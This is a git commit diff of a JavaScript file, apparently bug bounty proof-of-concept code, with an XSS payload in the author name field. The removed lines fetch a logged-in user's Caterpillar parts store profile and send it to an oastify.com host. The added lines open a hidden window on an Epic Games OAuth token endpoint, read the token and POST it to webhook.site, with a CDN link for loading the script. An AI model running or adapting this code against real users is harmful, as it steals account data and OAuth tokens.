3860041721e9957243b94549ddd55694b1ead1c8
s![CDATA[ img src onerror=alert(1) ]] <77415898+naysser@users.noreply.github.com>
2026-02-19 01:59:12 +0000

    Update 54.js

--- 54.js
+++ 54.js
@@ -1,4 +1,14 @@
-fetch('https://parts.cat.com/wcs/resources/store/20203/person/@self?responseFormat=json',{credentials:'include'})
-.then(r=>r.text())
-.then(t=>fetch('https://cr70ebszwf06lp7i0msf30hmwd24qwlka.oastify.com/exfil?data='+encodeURIComponent(t)))
-.catch(e=>console.log('Error:',e.message))
+//CDN: https://cdn.jsdelivr.net/gh/Johnathanrs/FN_BB1@main/bug_working.js
+//CDN: https://cdn.jsdelivr.net/gh/<username>/<repo_name>@<branch>/<file_name>
+
+(function() {
+  const target = window.open('https://content-service.bfda.live.use1a.on.epicgames.com/oauth/v1/token-detail','_blank','toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=10000, top=10000, width=10, height=10, visible=none', ''); 
+
+  target.addEventListener('DOMContentLoaded', () => {
+    const data = target.document.querySelectorAll('pre')[0].firstChild.data
+    console.log(data)
+  
+    const headers = {'Access-Control-Allow-Origin': '*','X-Bug-Bounty': 'Hackerone-johnathanrs','Content-Type': 'application/json'};
+    fetch('https://webhook.site/1da67bcc-a46f-48c1-b171-9339305c7be0',{method:'POST',body:JSON.stringify(data), headers:headers})
+  })
+})();
